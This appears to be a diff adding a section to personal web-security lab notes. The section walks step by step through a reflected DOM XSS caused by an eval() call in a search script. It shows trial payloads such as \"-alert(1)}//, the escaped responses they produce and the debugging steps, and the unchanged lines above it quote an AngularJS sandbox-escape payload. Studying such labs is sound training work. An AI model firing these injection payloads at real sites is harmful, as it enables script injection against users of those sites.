@@ -204,3 +204,90 @@ document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIC
 /?search=asdf{{constructor.constructor('alert(1)')()}}
 ```
 
+### Reflected DOM XSS
+```js
+// typical "search" response looks like:
+
+{"results":[],"searchTerm":"asdf"}
+
+// vulnerable part, inside /resources/js/searchResults.js
+
+function displaySearchResults(searchResultsObj) {
+	var blogHeader = document.getElementsByClassName("blog-header")[0];
+	var blogList = document.getElementsByClassName("blog-list")[0];
+	var searchTerm = searchResultsObj.searchTerm //"asdf"
+	var searchResults = searchResultsObj.results // []
+
+// how to confirm:
+// 1. use Debugger in firefox
+// 2. choose js/searchResults.js
+// 3. search breakpoint at "var searchTerm"
+// 4. under "Watch expressions", type "searchTerm", click enter
+// 5. refresh, see "searchTerm:"asdf"
+
+// moving on.. see where "searchTerm" lands
+var h1 = document.createElement("h1");
+h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
+blogHeader.appendChild(h1);
+var hr = document.createElement("hr");
+blogHeader.appendChild(hr)
+
+// turns out the real vulnerable portion is in the "eval" right at the start:
+
+xhr.onreadystatechange = function() {
+	if (this.readyState == 4 && this.status == 200) {
+		eval('var searchResultsObj = ' + this.responseText);
+		displaySearchResults(searchResultsObj);
+	}
+};
+
+// if input is "asdf", this.responseText becomes:
+
+this.responseText: '{"results":[],"searchTerm":"asdf"}'
+
+// we can try closing the " and adding an "-alert(1)" into the responseText
+// payload:
+
+/?search="-alert(1)-"}// //added "}// to close the curly brackets and comment out the rest of the JSON object
+
+// result:
+
+this.responseText: '{"results":[],"searchTerm":"\\"-alert(1)-\\"}//"}'
+
+// looks like double-quotes (") are being escaped using "\\"
+// try adding one "\" in our payload - so that when "\\" is added to the ("), the extra "\" turns it into \\\" , meaning the first two \\ escapes the third \ , and the " is no longer escaped
+// meaning our payload becomes:
+
+\"-alert(1)-"}//
+
+// this effectively turns the searchTerm into:
+
+"searchTerm":"\"-alert(1)-\\"}//
+
+// try it out:
+
+/?search=\"-alert(1)-"}//
+
+// response:
+
+this.responseText: '{"results":[],"searchTerm":"\\\\"-alert(1)-\\"}//"}'
+
+// we get an error: Uncaught SyntaxError: invalid escape sequence
+// the good thing here is our "\" isn't being properly escaped - we can confirm it:
+
+/?search=\
+<<- this.responseText: '{"results":[],"searchTerm":"\\"}'
+
+// this triggers an error: Uncaught SyntaxError: "" literal not terminated before end of script
+
+// back to our problem: in the first (") we already closed the double-quotation loop, so we don't actually need to add another (") behind.
+// we can simply close the JSON object with "}" without having to add a second (")
+
+\"-alert(1)-}//
+
+// we get another error: Uncaught SyntaxError: expected expression, got '}'
+
+\"-alert(1)}//
+
+// this finally worked - but still need deeper understanding why the second "-" wrecked it at first - it doesn't simply act as a separator?
+```
